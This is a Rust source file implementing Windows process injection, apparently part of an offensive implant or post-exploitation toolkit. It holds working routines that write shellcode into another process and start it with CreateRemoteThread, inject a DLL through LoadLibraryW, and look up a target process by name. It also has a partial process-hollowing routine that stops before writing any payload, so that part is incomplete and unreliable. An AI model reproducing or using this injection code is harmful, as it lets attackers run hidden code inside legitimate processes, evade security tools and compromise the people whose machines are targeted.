use std::process::Command;
use std::ptr;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::Foundation::*;

pub struct ProcessInjector;

impl ProcessInjector {
    pub fn migrate_to_process(pid: u32, shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        unsafe {
            // Open target process
            let h_process = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                false,
                pid,
            )?;
            
            // Allocate memory in target
            let remote_mem = VirtualAllocEx(
                h_process,
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            
            if remote_mem.is_null() {
                return Err("Failed to allocate memory".into());
            }
            
            // Write shellcode
            let mut written = 0usize;
            let result = WriteProcessMemory(
                h_process,
                remote_mem,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                Some(&mut written),
            );
            
            if !result.as_bool() {
                return Err("Failed to write memory".into());
            }
            
            // Change protection to executable
            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtectEx(
                h_process,
                remote_mem,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            )?;
            
            // Create remote thread
            let h_thread = CreateRemoteThread(
                h_process,
                None,
                0,
                Some(std::mem::transmute(remote_mem)),
                None,
                0,
                None,
            )?;
            
            // Wait for thread to complete (optional)
            WaitForSingleObject(h_thread, 5000);
            
            // Cleanup
            CloseHandle(h_thread)?;
            VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE)?;
            CloseHandle(h_process)?;
            
            Ok(())
        }
    }
    
    pub fn inject_dll(pid: u32, dll_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        unsafe {
            let h_process = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                false,
                pid,
            )?;
            
            // Allocate space for DLL path
            let path_bytes: Vec<u16> = dll_path.encode_utf16().chain(Some(0)).collect();
            let path_size = path_bytes.len() * 2;
            
            let remote_str = VirtualAllocEx(
                h_process,
                None,
                path_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            
            if remote_str.is_null() {
                return Err("Failed to allocate string".into());
            }
            
            // Write DLL path
            WriteProcessMemory(
                h_process,
                remote_str,
                path_bytes.as_ptr() as *const _,
                path_size,
                None,
            )?;
            
            // Get LoadLibraryW address
            let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const i8)?;
            let load_library = GetProcAddress(kernel32, "LoadLibraryW\0".as_ptr() as *const i8)?;
            
            // Create thread to load DLL
            let h_thread = CreateRemoteThread(
                h_process,
                None,
                0,
                Some(std::mem::transmute(load_library)),
                Some(remote_str),
                0,
                None,
            )?;
            
            WaitForSingleObject(h_thread, INFINITE);
            
            CloseHandle(h_thread)?;
            VirtualFreeEx(h_process, remote_str, 0, MEM_RELEASE)?;
            CloseHandle(h_process)?;
            
            Ok(())
        }
    }
    
    pub fn hollow_process(target_path: &str, shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        // Process hollowing implementation
        unsafe {
            // Create suspended process
            let mut si = STARTUPINFOA::default();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
            let mut pi = PROCESS_INFORMATION::default();
            
            CreateProcessA(
                PCSTR::from_raw(target_path.as_ptr()),
                PSTR::null(),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &si,
                &mut pi,
            )?;
            
            // Get thread context
            let mut ctx = CONTEXT::default();
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(pi.hThread, &mut ctx)?;
            
            // Unmap original executable
            let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
            ReadProcessMemory(
                pi.hProcess,
                (ctx.Ebx + 8) as *const _, // PEB.ImageBaseAddress offset
                &mut base_addr as *mut _ as *mut _,
                std::mem::size_of::<usize>(),
                None,
            )?;
            
            // Allocate new memory and write payload
            // ... (simplified - full implementation would rebuild PE headers)
            
            // Resume thread
            ResumeThread(pi.hThread);
            
            CloseHandle(pi.hThread)?;
            CloseHandle(pi.hProcess)?;
            
            Ok(())
        }
    }
    
    pub fn find_target_process(name: &str) -> Option<u32> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
            
            let mut entry = PROCESSENTRY32::default();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            
            if Process32First(snapshot, &mut entry).as_bool() {
                loop {
                    let proc_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                        .to_string_lossy();
                    
                    if proc_name.to_lowercase() == name.to_lowercase() {
                        CloseHandle(snapshot).ok()?;
                        return Some(entry.th32ProcessID);
                    }
                    
                    if !Process32Next(snapshot, &mut entry).as_bool() {
                        break;
                    }
                }
            }
            
            CloseHandle(snapshot).ok()?;
            None
        }
    }
}